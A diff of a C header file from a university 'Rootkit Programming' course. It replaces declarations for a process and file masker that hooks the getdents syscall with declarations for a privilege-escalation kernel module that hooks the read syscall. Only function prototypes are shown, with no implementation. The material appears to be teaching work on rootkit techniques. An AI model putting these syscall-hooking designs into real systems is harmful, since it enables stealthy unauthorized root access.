@@ -4,9 +4,9 @@
 /*   Course: Rootkit Programming                                               */
 /*   Semester: WS 2015/16                                                      */
 /*   Team: 105                                                                 */
-/*   Assignment: 3                                                             */
+/*   Assignment: 7                                                             */
 /*                                                                             */
-/*   Filename: process_masker.h                                                */
+/*   Filename: privil_escalation.h                                             */
 /*                                                                             */
 /*   Authors:                                                                  */
 /*       Name: Matei Pavaluca                                                  */
@@ -15,30 +15,20 @@
 /*       Name: Nedko Stefanov Nedkov                                           */
 /*       Email: nedko.stefanov.nedkov@gmail.com                                */
 /*                                                                             */
-/*   Date: November 2015                                                       */
+/*   Date: December 2015                                                       */
 /*                                                                             */
-/*   Usage:                                                                    */
+/*   Usage: Header file for module `privil_escalation.c`                       */
 /*                                                                             */
 /*******************************************************************************/
 
-#ifndef __PROCESS_MASKER__
-#define __PROCESS_MASKER__
+#ifndef __PRIVIL_ESCALATION__
+#define __PRIVIL_ESCALATION__
 
 
-#define PIDS_BUFFSIZE 8
+/* Declaration of functions */
+int privil_escalation_init(int);
+int privil_escalation_exit(void);
 
-struct linux_dirent {
-	long d_ino;
-	off_t d_off;
-	unsigned short d_reclen;
-	char d_name[];
-};
-
-asmlinkage int my_getdents_syscall(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
-int should_mask(const char *name);
-
-void hide_file(char *);
-void reveal_file(char *);
-
+asmlinkage long privil_escalation_read_syscall(unsigned int, char __user *, size_t, long);
 
 #endif
